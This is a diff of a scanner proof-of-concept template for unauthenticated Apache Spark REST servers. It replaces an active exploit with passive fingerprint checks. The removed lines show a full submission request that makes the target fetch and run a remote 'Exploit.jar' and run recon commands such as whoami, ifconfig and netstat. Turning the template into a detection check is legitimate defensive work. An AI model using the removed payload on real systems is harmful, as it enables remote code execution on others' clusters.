@@ -1,33 +1,15 @@
 name: poc-yaml-spark-unauth
 rules:
-  - method: POST
-    path: /v1/submissions/create
-    headers:
-      Content-Type: application/json
-    body: |
-      {
-        "action": "CreateSubmissionRequest",
-        "clientSparkVersion": "2.3.1",
-        "appArgs": [
-          "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
-        ],
-        "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
-        "environmentVariables": {
-          "SPARK_ENV_LOADED": "1"
-        },
-        "mainClass": "Exploit",
-        "sparkProperties": {
-          "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
-          "spark.driver.supervise": "false",
-          "spark.app.name": "Exploit",
-          "spark.eventLog.enabled": "true",
-          "spark.submit.deployMode": "cluster",
-          "spark.master": "spark://1.1.1.1:6066"
-        }
-      }
+  - method: GET
+    path: /
     follow_redirects: false
-    expression: >
-      response.status == 200 && response.body.bcontains(b"success") && response.body.bcontains(b"submissionId") && response.body.bcontains(b"Spark")
+    expression: |
+      response.status == 400 && response.body.bcontains(b"ErrorResponse") && response.body.bcontains(b"serverSparkVersion")
+  - method: GET
+    path: /v1/submissions
+    follow_redirects: false
+    expression: |
+      response.status == 400 && response.body.bcontains(b"create") && response.body.bcontains(b"kill")
 detail:
   author: betta(https://github.com/betta-cyber)
   links:
